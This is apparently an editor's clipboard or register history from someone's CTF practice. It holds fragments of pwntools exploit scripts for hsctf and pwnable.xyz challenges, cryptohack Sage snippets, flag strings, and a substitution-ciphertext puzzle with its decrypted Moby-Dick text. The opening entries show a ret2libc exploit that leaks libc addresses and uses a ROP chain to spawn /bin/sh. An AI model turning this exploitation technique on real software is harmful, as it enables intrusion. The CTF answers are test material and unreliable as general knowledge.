	payload += p64(EAT)
	payload += p64(SLEEP)
	payload += p64(MAIN_ADDR)
	io.sendline(payload)
	
	line = io.recvline_contains("happy")
	line = io.recvline(False).ljust(8, b'\x00')
	PRINTF_LIBC = u64(line)
	log.info('Printf@libc: %#x' % PRINTF_LIBC)
	
	libc = ELF('./libc6_2.27-3ubuntu1_amd64/libc-2.27.so')
	# libc = ELF('./libc6_2.30-0ubuntu2_amd64/libc-2.30.so')
	LIBC_BASE = PRINTF_LIBC - libc.sym.printf
	log.info("libc base: %#x" % LIBC_BASE)
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	log.info("System addr: %#x" % SYSTEM_ADDR)
	BINSH_ADDR = LIBC_BASE + next(libc.search(b'/bin/sh'))
	log.info("/bin/sh addr: %#x" % BINSH_ADDR)
	
	payload = b"A" * OFFSET
	payload += p64(POP_RDI)
	payload += p64(BINSH_ADDR)
	payload += p64(RET_GADGET)
	payload += p64(SYSTEM_ADDR)
	io.sendline(payload)
	
	io.interactive()
	
acd76b0a498878723eade6a1d10fc042|file:///home/neo/CTFs/hsctf/gotit/exploit.py|101|1|V|python
	payload += p64(POP_RDI)
	payload += p64(BINSH_ADDR)
	payload += p64(RET_GADGET)
	payload += p64(SYSTEM_ADDR)
bf01688bd417c9b40110f68af4b4b148|file:///home/neo/CTFs/hsctf/gotit/exploit.py|92|1|V|python
	# libc = ELF('./libc6_2.30-0ubuntu2_amd64/libc-2.30.so')
	LIBC_BASE = PRINTF_LIBC - libc.sym.printf
	log.info("libc base: %#x" % LIBC_BASE)
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	log.info("System addr: %#x" % SYSTEM_ADDR)
	BINSH_ADDR = LIBC_BASE + next(libc.search(b'/bin/sh'))
	log.info("/bin/sh addr: %#x" % BINSH_ADDR)
9eba502d85e6cd47aae4a6875ecb1802|file:///home/neo/CTFs/hsctf/gotit/exploit.py|61|1|V|python
	payload = b"A" * OFFSET
	payload += p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(PUTS_PLT)
	payload += p64(EAT)
	payload += p64(SLEEP)
	payload += p64(MAIN_ADDR)
	io.sendline(payload)
	
	line = io.recvline_contains("happy")
	line = io.recvline(False).ljust(8, b'\x00')
	PUTS_LIBC = u64(line)
	log.info('Puts@libc: %#x' % PUTS_LIBC)
	
	io.recvline_contains("pwnagotchi's")
	
	payload = b"A" * OFFSET
	payload += p64(POP_RDI)
	payload += p64(PRINTF_GOT)
	payload += p64(PUTS_PLT)
	payload += p64(EAT)
	payload += p64(SLEEP)
	payload += p64(MAIN_ADDR)
	io.sendline(payload)
	
	line = io.recvline_contains("happy")
	line = io.recvline(False).ljust(8, b'\x00')
	PRINTF_LIBC = u64(line)
	log.info('Printf@libc: %#x' % PRINTF_LIBC)
	
	libc = ELF('./libc6_2.27-3ubuntu1_amd64/libc-2.27.so')
	
007a6bb6fc7ec791dbe4a08f39a6b8f8|file:///home/neo/CTFs/hsctf/gotit/exploit.py|55|1|V|python
	POP_RDI = 0x00000000004009f3
	rop = ROP(exe)
	RET_GADGET = 0x0000000000400285
9246f4eb5fda161f51368080ba2e03eb|file:///home/neo/CTFs/hsctf/gotit/exploit.py|49|1|V|python
	EAT = exe.sym.eat
	SLEEP = exe.sym.zzz
17dea6cc0c501212b9d1fc154b27f92f|file:///home/neo/CTFs/hsctf/gotit/exploit.py|6|31|v|python
	pwnagotchi
4ee368e32c9fc637e8f02395d2c5df65|file:///home/neo/CTFs/hsctf/gotit/exploit.py|47|1|V|python
	io.recvuntil("name: ")
3763fc47b3ffa365f72704fedf26dc6e|file:///home/neo/CTFs/hsctf/gotit/exploit.py|47|1|V|python
	rop = 
bcefa15aeb27678f5fd95d4b3e8b170c|file:///home/neo/CTFs/hsctf/gotit/exploit.py|38|2|V|python
	    pie breakpoint *0x000000000040091c
5448ee72e5b03cceee1800deb08b85e3|file:///home/neo/CTFs/hsctf/gotit/exploit.py|52|1|V|python
	log.info("poprdi gdg: %#x" % POP_RDI)
75563dc1c34833be56506066e66dd70d|file:///home/neo/CTFs/hsctf/gotit/exploit.py|60|10|v|python
	= p64(POP_RDI)
0c84d347525ebb567799211aaa045df9|file:///home/neo/CTFs/hsctf/gotit/exploit.py|49|19|V|python
	PUTS_PLT = exe.plt['puts']
	PRINTF_GOT = exe.got['printf']
	PUTS_GOT = exe.got['puts']
75e8175555bd1faa5bc5f0767afd3ba9|file:///home/neo/CTFs/hsctf/gotit/exploit.py|58|1|V|python
	# payload += p64(POP_RDI)
	# payload += p64(PUTS_GOT)
	# payload += p64(PUTS_PLT)
4b0deac54c14a4d21fb953277fca331c|file:///home/neo/CTFs/hsctf/gotit/exploit.py|51|1|V|python
	MPROTECT = 0x403000
43074952049c21b074a7813debfd7485|file:///home/neo/CTFs/hsctf/gotit/exploit.py|43|5|V|python
	    b main
de03ce7bb501e7eb87c311cd4bd4acd7|file:///home/neo/CTFs/hsctf/gotit/exploit.py|56|1|V|python
	payload += p64(MPROTECT)
855a1bd5a32d307b38c5769e5282965d|file:///home/neo/CTFs/hsctf/gotit/exploit.py|55|12|V|python
	OFFSET = 254
	payload = b"A" * OFFSET
	payload += b"B" * 8
b875089da3aea3e2cae66e8cc981ece7|file:///home/neo/CTFs/hsctf/gotit/exploit.py|43|5|V|python
	    b *0x0000000000401000
b5bca4c6eb0f3ee303b2cc96cf5e9b1a|file:///home/neo/CTFs/hsctf/affina/Affina_and_the_Quadratics.txt|3|47|v|text
	7rr4p6_4e_4ph6bo8hap2?
196f521a4bf1a4ffe8bb095fec386989|file:///home/neo/CTFs/hsctf/primes/Primes.txt|1|1|v|text
	fe7l1Owa85YA9g8CELs3F
d1dcf2aac4ab9b85d5af3f8897142a09|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|15|7|v|python
	vectors[0]
86b202299b3698d109db2b173b3f98f6|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|15|1|V|python
	print(len(vectors))
c811d2c40b5844b937c3826fa0dce59c|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|2|5|V|python
	    u = [None] * len(vectors)
d332db0a6153f37fab1cb700dda6631a|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|2|5|V|python
	    print(u)
c0af7d5be97208d3511fc379cd441632|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|4|20|v|python
	1, len(v), 1
956f46c940a7963b44a3d80b9de79ffc|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|5|24|v|python
	1 i, 1
ef99231a3577cfcf178b0a72773e62e3|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|15|11|V|python
	basis = gram_schmid(vectors)
	print(basis)
d90d68502e2c040c922e44e6e7f01a6d|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|16|1|V|python
	print(basis)
c30bf5518624a53dc2062f37fc3cd299|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|19|2|V|python
	# for b in basis:
	#     print(float(b))
5cb9d8dc5ac78d77b2c63fce3edeef39|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|18|1|V|python
	# print(gram_schmidt(vectors))
ed0e480f142c809d9690bed16ccec9cc|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|11|1|v|python
	#     return(u[-1])
6b7e07e07a20d0f1036792885983a9d7|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|8|13|V|python
	            print(j)
17df5faaa3c5a21b02fbb006e343f6d8|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|8|1|V|python
	        for j in range(i):
ea3597f4781be984d6d7529fd8c3b916|file:///home/neo/cryptohack/general/mathematics/gram_schmid.sage|11|11|V|python
	            u[i] = v[i] - m * u[j]
25a9b4a832290ffeef619de6376348b7|file:///home/neo/cryptohack/general/mathematics/gram_schmidt.sage|22|1|V|python
	print(basis[)
25b9265ddf03b0f1872ff3776b650371|file:///home/neo/cryptohack/general/mathematics/gram_schmidt.sage|23|5|V|python
	    print(float(b))
62fd91e833b43a6fe192419e20d50d74|file:///home/neo/cryptohack/general/mathematics/gram_schmidt.sage|23|5|V|python
	    print(b)
ce6bf0ac207ae6f009d9ebbca89beee7|file:///home/neo/cryptohack/general/mathematics/gram_schmidt.sage|21|1|V|python
	basis = gram_schmidt(vectors)[0]
531248ef5af5b86baf49dfff8e2e4afb|file:///home/neo/cryptohack/general/mathematics/gaussian_reduction.sage|15|1|V|python
	gaussian_reduction(v, u)
2c37b9310a922fe881fe4d938a950703|file:///home/neo/CTFs/hsctf/affina/Affina_and_the_Quadratics.txt|7|1|V|text
	20ee4m4_4e_4mu4gg12ucm12
1faaed7134a782e089b3ea0f89c0f334|file:///home/neo/CTFs/hsctf/affina/Affina_and_the_Quadratics.txt|7|1|V|text
	4ff1n3_1s_1nt3re5tin6
fca1c8341dacd4044ba2015365e43e5a|file:///home/neo/CTFs/hsctf/affina/Affina_and_the_Quadratics.txt|7|1|V|text
	5ff4n8_4s_4nt8re7tin0
74c07ffec351d03962ca2f5537f8a7b0|file:///home/neo/CTFs/hsctf/affina/Affina_and_the_Quadratics.txt|3|47|v|text
	7rr4p6_4e_4ph6bo8hap2
b6dba1370e8d05fc5ea55fe374cfbd46|file:///home/neo/CTFs/hsctf/affina/Affina_and_the_Quadratics.txt|8|1|V|text
	?ff?n?_?s_?nt?re?tin?
6fb80e6337f67f96f0553abf1cab62aa|file:///home/neo/Documents/Chall-HelperTexts/chal_7_helper.txt|1|1|V|text
	0, 0, 1, 2, 3, 6, 12, 25, 49, 98, 197, 394, 787, 1574, 3148, 6296, 12593, 25185, 50371, 100742, 201484, 402967, 805935, 1611870, 3223740, 6447479, 12894959, 25789918, 51579835, 103159670, 206319340, 412638681, 825277361, 1650554722, 3301109445, 6602218890, 13204437779, 26408875558, 52817751117, 105635502233, 211271004467, 422542008933, 845084017867, 1690168035734, 3380336071467, 6760672142934, 13521344285869, 27042688571737, 54085377143475
d0bc6adcd1427a0322890525b698505e|file:///home/neo/vimwiki/Pwn.wiki|58|1|V|vimwiki
	    `def local(argv=[], *a, **kw):`
	        `return process([exe.path] + argv, stdin=PTY, raw=False)`
8e3130a76b9c0f50c2fdb3539dba7148|file:///home/neo/pwnablexyz/welcome/exploit.py|46|1|V|python
	# io.sendline(cyclic(1024))
	OFFSET = cyclic_find(0x6161616c)
	payload = "A" * OFFSET
	io.sendline(payload)
9d18ca937e89684821991b165f69c471|file:///home/neo/pwnablexyz/welcome/exploit.py|46|1|V|python
	OFFSET = cyclic_find(0x6161616c)
	payload = "A" * OFFSET
a39796bb0e7f0be67d4908ab3fb0b857|file:///home/neo/pwnablexyz/welcome/exploit.py|46|18|v|python
	.hex()
f788691023b2e5412d3479b8a0535dc5|file:///home/neo/pwnablexyz/welcome/exploit.py|47|1|V|python
	print(leak)
61f00bd00b4839bf20a457b1c69240bb|file:///home/neo/pwnablexyz/welcome/exploit.py|48|1|V|python
	io.sendline(str(len(str(leak))))
ba3becd6fffb93d2f951dc60e154cd5b|file:///home/neo/pwnablexyz/welcome/exploit.py|48|1|V|python
	io.sendline(str(leak))
e113d219a1eb4678094a9d435a791d25|file:///home/neo/pwnablexyz/welcome/exploit.py|48|1|V|python
	io.recvuntil('message: ')
56ba50dc421d01644f751163c5073bb4|file:///home/neo/pwnablexyz/welcome/exploit.py|51|1|V|python
	io.recvuntil('')
5aae2b956951ec9f5444d248f6ea9dba|file:///home/neo/pwnablexyz/welcome/exploit.py|42|5|V|python
	    b puts
15f3ec67dec4927d7ab1633f55dc53de|file:///home/neo/pwnablexyz/welcome/exploit.py|42|5|V|python
	    b *0x555555554951
56b6e2db1becc252029add39991da61c|file:///home/neo/pwnablexyz/welcome/exploit.py|50|1|V|python
	log.info("Leak: %#x" % leak)
89a489d281af671c4d79d31d472805c5|file:///home/neo/pwnablexyz/welcome/exploit.py|56|28|v|python
	leak
927b507310b0d27f363d680b1ba8fdff|file:///home/neo/pwnablexyz/welcome/exploit.py|55|20|V|python
	line = io.recvline()
	log.info("Received: %#x" % line)
bdee0ef3f665f19835c68d6f13b1adc7|file:///home/neo/pwnablexyz/welcome/exploit.py|54|13|v|python
	p64(leak - EBP - 1)
ab18f33143e40041a3e156a6919152d3|file:///home/neo/pwnablexyz/sub/exploit.py|47|1|V|python
	EBP = 0x5555557572a0
	line = io.recvline_contains("Leak")
	leak = int(line[-14:], 16)
	log.info("Leak: %#x" % leak)
686d32a004de7fd3ad4aab3c647b4f81|file:///home/neo/pwnablexyz/sub/exploit.py|47|1|V|python
	io.recvuntil('message: ')
	io.sendline(str(leak + 1))
	io.recvuntil('message: ')
	io.sendline('a')
524eacf3389d9464330bbc9774ee70a9|file:///home/neo/pwnablexyz/sub/exploit.py|49|1|V|python
	io.sendline('-1')
cf28b3fb3fd852c4917809ce0b43d7d9|file:///home/neo/pwnablexyz/sub/exploit.py|47|1|V|python
	# io.recvline_contains('1337')
c2cf21d7e70b4f0a98f89545c2455c01|file:///home/neo/pwnablexyz/sub/exploit.py|48|1|V|python
	# line = io.recvline()
	# log.info("Flag: %s" % line)
cc8fddaca16341ab95c315bb6cf5d16d|file:///home/neo/pwnablexyz/add/exploit.py|47|1|V|python
	io.sendline('4918 -1')
8467aa6a022f2a15244e4db04f419b00|file:///home/neo/pwnablexyz/add/exploit.py|47|1|V|python
	PRINTF
5adaea96d2e8d43176e4c428381a047c|file:///home/neo/pwnablexyz/add/exploit.py|49|1|V|python
	log.info("Win address: %#x" % WIN_ADDR)
49b8616703a024b29dd95603ce99e681|file:///home/neo/pwnablexyz/add/exploit.py|50|34|v|python
	WIN_ADDR
847b5fb6441fced01711b65e6c4ac5d1|file:///home/neo/pwnablexyz/add/exploit.py|54|1|V|python
	# log.info("Printf address: %#x" % PRINTF_ADDR)
00a0e0ee8f20f6a04b2989649a7628d7|file:///home/neo/pwnablexyz/add/exploit.py|55|11|v|python
	Printf address
13d40b7d95fac5beef709dab5f4965bb|file:///home/neo/pwnablexyz/add/exploit.py|55|27|v|python
	PRIwNTF_ADDR
46eca9f4c6249dc1b4805265f0b45480|file:///home/neo/pwnablexyz/add/exploit.py|56|1|V|python
	io.recvline_contains("Input")
778a475bfbae81d16e4c20207ca7431f|file:///home/neo/pwnablexyz/add/exploit.py|59|10|V|python
	io.sendline(payload)
	
7c6b97abcfe5a51d6ca499a96440dd4a|file:///home/neo/pwnablexyz/add/exploit.py|43|5|V|python
	    piebase 0x9e0
1ebc55f59f2a80a79f37dbda25a90842|file:///home/neo/pwnablexyz/add/exploit.py|51|2|v|python
	AX_VAL = (PRINTF_ADDR - RBP_VAL + 0x60) // 8
689a3d847b33ac7b1860a1e44cc835b8|file:///home/neo/pwnablexyz/add/exploit.py|50|1|V|python
	RBP_VAL = 0x7ffd316257e0
4d75b8b7046036a33f2dba465ab58028|file:///home/neo/pwnablexyz/add/exploit.py|51|17|v|python
	316257e0
9dd9880c68986de391f42a98e379942f|file:///home/neo/pwnablexyz/add/exploit.py|52|1|V|python
	RAX_VAL = -10
d8b78268a8f003955a1620ef1562f7bc|file:///home/neo/pwnablexyz/add/exploit.py|52|12|v|python
	0xffffff0000000000
c86745e649923b155340d211780a5d8f|file:///home/neo/pwnablexyz/add/exploit.py|57|1|V|python
	log.info("RAX_VAL: %#x" % RAX_VAL)
27be4c51559f40645f29790fcdfe2471|file:///home/neo/pwnablexyz/add/exploit.py|53|1|V|python
	RAX_VAL = 0
c4259916c5ce4b450c0985608f01f163|file:///home/neo/pwnablexyz/add/exploit.py|52|10|v|python
	  RBP_VAL//8
b62c05abf04d22aa236e59e91a08dc62|file:///home/neo/pwnablexyz/add/exploit.py|50|1|V|python
	RBP_VAL = 0x7ffd00000000
edfa841fce1d5394334de5079aaa792b|file:///home/neo/pwnablexyz/add/exploit.py|52|1|V|python
	RAX_VAL = -0x1000
93de0284d72de34dfd8eed3a54386ace|file:///home/neo/pwnablexyz/add/exploit.py|52|1|V|python
	RAX_VAL = -0x100000000000
645a8aca5a5b84527c57ee2f153f1946|file:///home/neo/pwnablexyz/add/exploit.py|53|15|v|python
	00000000000
c0778c1ad6cf7105407586851c3bf073|file:///home/neo/pwnablexyz/add/exploit.py|52|12|v|python
	0xfffffffffff
9d2f97929373a5c9c7548cf49a43f88d|file:///home/neo/pwnablexyz/add/exploit.py|59|25|V|python
	io.sendline(str(RCX_VAL))
	io.sendline(str(RAX_VAL))
6ccbbe96428146f0a86c85b025a0c649|file:///home/neo/pwnablexyz/add/exploit.py|50|1|V|python
	RBP_VAL = 0x7ffde0000000
e942ad75cb8b0848eaa3e3d8593cac2d|file:///home/neo/pwnablexyz/add/exploit.py|50|1|V|python
	# RAX_VAL = (PRINTF_ADDR - RBP_VAL + 0x60) // 8
aad07536345e69d2da7b3bed95ffa6a8|file:///home/neo/pwnablexyz/add/exploit.py|49|1|V|python
	PRINTF_ADDR = exe.sym.printf
75ca8ef76ef45ea3b9d91720fd053369|file:///home/neo/pwnablexyz/add/exploit.py|56|18|v|python
	'Input:',str(RDX_VAL) + str(RCX_VAL) + str(RAX_VAL)
20a5b3527b38d37d15b62708e4ee9ecb|file:///home/neo/pwnablexyz/add/exploit.py|55|7|v|python
	str(RDX_VAL) + " " + str(RCX_VAL) + " " + str(RAX_VAL)
1e8456ba1ae703938433d64ab097a2e0|file:///home/neo/pwnablexyz/add/exploit.py|56|81|v|python
	str(RDX_VAL) + str(RCX_VAL) + str(RAX_VAL))
01389badd0c9956779eac63fd074528b|file:///home/neo/pwnablexyz/add/exploit.py|55|1|V|python
	print(str(RDX_VAL) + " " + str(RCX_VAL) + " " + str(RAX_VAL))
45a572673ae6d37f1bde37277d1719d6|file:///home/neo/pwnablexyz/add/exploit.py|53|1|V|python
	# log.info("Printf address: %#x" % PRINTF_ADDR)
	# log.info("RAX_VAL: %#x" % RAX_VAL)
88179f3e4da7c9d17b7fd872451e0960|file:///home/neo/pwnablexyz/add/exploit.py|53|1|V|python
	io.sendlineafter('Input:',str(RDX_VAL) + " " + str(RCX_VAL) + " " + str(RAX_VAL))
708b8d1561e36e256d59d63e52000a9e|file:///home/neo/pwnablexyz/add/exploit.py|54|27|v|python
	str(RDX_VAL) + " " + str(RCX_VAL) + " " + str(RAX_VAL))
bbebb59659e835a65f94b8b2614f1c50|file:///home/neo/pwnablexyz/add/exploit.py|54|1|V|python
	io.sendlineafter('Input:', 'a')
92874fc31d1e8a8106f7b9eec3b7263d|file:///home/neo/pwnablexyz/add/exploit.py|49|12|V|python
	RAX_VAL = 20
	RCX_VAL = 0
df8de1e1ddd9ee1fcf186f501b179fc6|file:///home/neo/pwnablexyz/add/exploit.py|49|1|V|python
	RDX_VAL = WIN_ADDR
f2dcab6e73ce9204d5248a1cf8b07783|file:///home/neo/pwnablexyz/add/exploit.py|50|31|v|python
	RDX_VAL
b7e937d9fc17f00b72a8e735ade39baf|file:///home/neo/pwnablexyz/add/exploit.py|50|41|v|python
	+ " " + str(RCX_VAL) + " " + str(RAX_VAL))
fc6e5619e1d2614170c1de95ad818856|file:///home/neo/pwnablexyz/add/exploit.py|50|1|V|python
	io.sendlineafter('Input:',str(WIN_ADDR) + "0 13")
1c5d9bdb3986d0d608767925b131eea9|file:///home/neo/pwnablexyz/add/exploit.py|51|27|v|python
	str(WIN_ADDR) + "0 13")
297de1566e0ff893a1587846070eaa2f|file:///home/neo/pwnablexyz/add/exploit.py|51|1|V|python
	io.sendlineafter('Input:', "A")
c7655c78281ae73a4c76c0877b593ddc|file:///home/neo/pwnablexyz/add/exploit.py|52|1|V|python
	io.sendlineafter('Input:', str(WIN_ADDR) + " 0 " + str(RAX))
ac43a86908b5f745474914a8085cb7df|file:///home/neo/pwnablexyz/add/exploit.py|53|27|v|python
	 str(WIN_ADDR) + " 0 " + str(RAX))
24c284c7416d5e71835a800345f2dba1|file:///home/neo/CTFs/batpwn2020/mick/ciph3r.txt|1|1|V|text
	 T khbtpdiv exiixlzu rbtw, fsu uzrpzsutsj tswx woz kfm-mxxn fppxrwzu woz jmtsstsj fifsuixmu gzmv cizfrfswiv. T pozmtrozu sx nfitpz wxlfmur otn, woxbjo oz ofu kzzs rdvifmdtsj ltwo nz sxw f itwwiz ts woz nfwwzm xe nv kzueziixl.
	
	Oxlzgzm, f jxxu ifbjo tr f ntjowv jxxu wotsj, fsu mfwozm wxx rpfmpz f jxxu wotsj; wwoz nxmz‚Äôr woz ctwv. Rx, te fsv xsz nfs, ts otr xls cmxczm czmrxs, feexmu rwbee exm f jxxu yxdz wx fsvkxuv, izw otn sxw kz kfpdlfmu, kbw izw otn pozzmebiiv fiixl otnrzie wx rczsu fsu kz rczsw ts wofw lfv. Fsu woz nfs wofw ofr fsvwotsj kxbswtebiiv ifbjofkiz fkxbw otn, kz rbmz wozmz tr nxmz ts wofw nfs wofs vxb czmofcr wotsd exm.
	
	Woz kfm-mxxn lfr sxl ebii xe woz ckxfmuzmr lox ofu kzzs umxcctsj ts woz stjow cmzgtxbr, fsu loxn T ofu sxw fr vzw ofu f jxxu ixxd fw. Wozv lzmz szfmiv fii lofiznzs; potze nfwzr, fsu rzpxsu nfwzr, fsu wotmu nfwzr, fsu rzf pfmczswzmr, fsu rzf pxxczmr, fsu rzf kifpdrntwor, fsu ofmcxxszzmr, fsu rotc dzzczmr; f kmxls fsu kmflsv pxncfsv, ltwo kxrdv kzfmur; fs bsroxms, rofjjv rzw, fii lzfmtsj nxsdzv yfpdzwr exm nxmstsj jxlsr.
	
	Vxb pxbiu cmzwwv ciftsiv wzii oxl ixsj zfpo xsz ofu kzzs froxmz. Wotr lvxbsj eziixl‚Äôr ozfiwov pozzd tr itdz f rbs-wxfrwzu czfm ts obz, fsu lxbiu rzzn wx rnzii finxrw fr nbrdv; oz pfssxw ofgz kzzs womzz ufvr ifsuzu emxn otr Tsutfs gxvfjz. Wofw nfs szqw otn ixxdr f ezl rofuzr itjowzm; vxb ntjow rfv f wxbpo xe rfwts lxxu tr ts otn. Ts woz pxncizqtxs xe f wotmu rwtii itsjzmr f wmxctp wfls, kbw ritjowiv kizfpozu ltwofi; oz uxbkwizrr ofr wfmmtzu loxiz lzzdr froxmz. Kbw lox pxbiu roxl f pozzd itdz Hbzzhbzj? lotpo, kfmmzu ltwo gfmtxbr swtswr, rzznzu itdz woz Fsuzr‚Äô lzrwzms rixcz, wx roxl exmwo ts xsz fmmfv, pxswmfrwtsj pitnfwzr, axsz kv axsz.
	
	‚ÄúJmbk, ox!‚Äù sxl pmtzu woz {ifsuixmu, eitsjtsj xczs f uxxm, fsu ts lz lzsw wx kmzfdefrw.
	
	Wozv rfv wofw nzs lox ofgz rzzs woz lxmiu, wozmzkv kzpxnz hbtwz fw zfrz ts nfsszm, hbtwz rzie-cxrrzrrzu ts pxncfsv. Sxw filfvr, woxbjo: Izuvfmu, woz jmzfw Szl Zsjifsu wmfgzioizm, fsu Nbsjx Cfmd, woz Rpxwpo xsz; xe fii nzs, wozv cxrrzrrzu woz izfrw frrbmfspz ts woz cfmixm. Kbw czmofcr woz nzmz pmxrrtsj xe Rtkzmtf ts f rizujz umfls kv uxjr fr Izuvfmu utu, xm woz wfdtsj f ixsj rxitwfmv lfid xs fs zncwv rwxnfpo, ts woz szjmx ozfmw xe Femtpf, lotpo lfr woz rbn xe cxxm Nbsjx‚Äôr czmexmnfspzr‚Äîwottr dtsu xe wmfgzi, T rfv, nfv sxw kz woz gzmv kzrw nxuz xe fwwftstsj f otjo rxptfi cxitro. Rwtii, exm woz nxrw cfmw, wofw rxmw xe wotsj tr wx kz ofu fsvlozmz.
	
	Wozrz mzeizpwtxsr ybrw ozmz fmz xppfrtxszu kv woz ptmpbnrwfuspz wofw fewuzm lz lzmz fii rzfwzu fw woz wfkiz, fsu3 T lfr cmzcfmtsj wx ozfm rxnz jxxu rwxmtzr fkxbw lofitsj; wx nv sx rnfii rbmcmtrz, szfmiv zgzmv nfs nftswftszu f cmxexbsu rtizspz. Fsu sxw xsiv wofw, kbw wozv ixxdzu znkfmmfrrzu. Vzr, ozmz lzmz f rzw xe srzf-uxjr, nfsv xe loxn ltwoxbw woz _ritjowzrw kfroebiszrr ofu nkxfmuzu jmzfw lofizr xs woz otjo rzfr‚Äîzswtmz rwmfsjzmr wx wozn‚Äîfsu ubziizu wozn uzfu ltwoxbw ltsdtsj; fsu vzw, ozmz wozv rfw fw f rxptfi xkmzfdefrw wfkiz‚Äîfii xe woz rfnz pfiitsj, fii xe dtsumzu wfrwzr‚Äîixxdtsj mxbsu fr rozzctroiv fw zfpo xwozm fr woxbjo wozv ofu szgzm kzzs xbw xe rtjow xe rxnz rozzcexiu fnxsj woz Jmzzs Nxbswftsr. F pbmtxbr rtjow; wozrz kfroebi kzfmr, wozrz kwtntu lfmmtxm lofiznzs!
	
	Kbw fr exm Hbzzhbzj‚Äîlov, Hbzzhbzj rfw wozmz fnxsj wozn‚Äîfvw woz ozfu xe woz wfkiz, wxx, tw rx pofspzu; fr pxxi fr fs tptpiz. Wx kz rbmz T pfssxw rfv nbpo exm otr kmzzutsj. Otr jmzfwzrw funtmzm pxbiu sxw ofgz pxmutfiiv ybrwtetzu otr kmtsjtsj otr ofmcxxs tswx kmzfdefrw ltwo otn, fsu brtsj tw wozmz ltwoxbw pzmznxsv; mzfpotsj xgzm woz wfkiz ltwo tw, _wx woz tnntszsw yzxcfmuv xe nfsv ozfur, fsu jmfccitsj woz kzzerwzfdr wxlfmur otn. Kbw wofw lfr pzmwftsiv gzmv pxxiiv uxsz kv otn, fsu zgzmv xsz dsxlr wofw ts nxrw czxciz‚Äôr uzrwtnfwtxs, wx ux fsvwotsj pxxiiv tr wx ux tw tjzswzziiv.
	
	Lz ltii psxw rczfd xe fii Hbzzhbzj‚Äôr czpbitfmtwtzr ozmz; oxl oz zrpozlzu pxeezz fsu oxw mxiir, fsu fccitzu otr bsutgtuzu fwwzswtxs wx kzzerwzfdr, uxsz mfmz. Zsxbjo, wofw lozs dkmzfdefrw lfr xgzm oz ltwoumzl itdz woz mzrw tswx woz cbkitp mxxn, itjowzu otr wxnfofld-ctcz, fsu lfr rtwwtsj wozmz hbtzwiv utjzrwtsj fsu rnxdtsj ltwo otr tsrzcfmfkiz ofw xs, lozs T rfiitzu xbw exm f} rwmxii. 
872963121b2f9738df7f7285cd2acc75|file:///home/neo/CTFs/batpwn2020/mick/solve.py|5|1|V|python
	# find those words that may be misspelled
6798bf89742a2a595341db41c78b0bba|file:///home/neo/CTFs/batpwn2020/mick/solve.py|7|28|v|python
	['let', 'us', 'wlak','on','the','groun']
be02fa20915cef16d544afc258ebac16|file:///home/neo/CTFs/batpwn2020/mick/decrypted.txt|1|1|V|text
	I bquickly followed suit, and descending into the bar-room accosted the grinning alandlord very pleasantly. I cherished no malice towards him, though he had been skylarking with me not a little in the matter of my bedfellow. However, a good laugh is a mighty good thing, and rather too scarce a good thing; tthe more‚Äôs the pity. So, if any one man, in his own proper person, afford stuff for a good joke to anybody, let him not be backward, but let him cheerfully allow himself to spend and be spent in that way. And the man that has anything bountifully laughable about him, be sure there is more in that man than you perhaps think for. The bar-room was now full of the pboarders who had been dropping in the night previous, and whom I had not as yet had a good look at. They were nearly all whalemen; chief mates, and second mates, and third mates, and sea carpenters, and sea coopers, and sea blacksmiths, and harpooneers, and ship keepers; a brown and brawny company, with bosky beards; an unshorn, shaggy set, all wearing monkey jackets for morning gowns. You could pretty plainly tell how long each one had been ashore. This wyoung fellow‚Äôs healthy cheek is like a sun-toasted pear in hue, and would seem to smell almost as musky; he cannot have been three days landed from his Indian voyage. That man next him looks a few shades lighter; you might say a touch of satin wood is in him. In the complexion of a third still lingers a tropic tawn, but slightly bleached withal; he doubtless has tarried whole weeks ashore. But who could show a cheek like Queequeg? which, barred with various ntints, seemed like the Andes‚Äô western slope, to show forth in one array, contrasting climates, zone by zone. ‚ÄúGrub, ho!‚Äù now cried the {landlord, flinging open a door, and in we went to breakfast. They say that men who have seen the world, thereby become quite at ease in manner, quite self-possessed in company. Not always, though: Ledyard, the great New England travelhler, and Mungo Park, the Scotch one; of all men, they possessed the least assurance in the parlor. But perhaps the mere crossing of Siberia in a sledge drawn by dogs as Ledyard did, or the taking a long solitary walk on an empty stomach, in the negro heart of Africa, which was the sum of poor Mungo‚Äôs performances‚Äîthiis kind of travel, I say, may not be the very best mode of attaining a high social polish. Still, for the most part, that sort of thing is to be had anywhere. These reflections just here are occasioned by the circumstadnce that aftder we were all seated at the table, and3 I was preparing to hear some good stories about whaling; to my no small surprise, nearly every man maintained a profound silence. And not only that, but they looked embarrassed. Yes, here were a set of nsea-dogs, many of whom without the _slightest bashfulness had mboarded great whales on the high seas‚Äîentire strangers to them‚Äîand duelled them dead without winking; and yet, here they sat at a social obreakfast table‚Äîall of the same calling, all of kindred tastes‚Äîlooking round as sheepishly at each other as though they had never been out of sight of some sheepfold among the Green Mountains. A curious sight; these bashful bears, these btimid warrior whalemen! But as for Queequeg‚Äîwhy, Queequeg sat there among them‚Äîayt the head of the table, too, it so chanced; as cool as an icicle. To be sure I cannot say much for his breeding. His greatest admirer could not have cordially justified his bringing his harpoon into breakfast with him, and using it there without ceremony; reaching over the table with it, _to the imminent jeopardy of many heads, and grappling the beefsteaks towards him. But that was certainly very coolly done by him, and every one knows that in most people‚Äôs destimation, to do anything coolly is to do it igenteelly. We will cnot speak of all Queequeg‚Äôs peculiarities here; how he eschewed coffee and hot rolls, and applied his undivided attention to beefsteaks, done rare. Enough, that when kbreakfast was over he withdrew like the rest into the public room, lighted his tomahawk-pipe, and was sitting there quietly digesting and smoking with his inseparable hat on, when I sallied out for a} stroll.
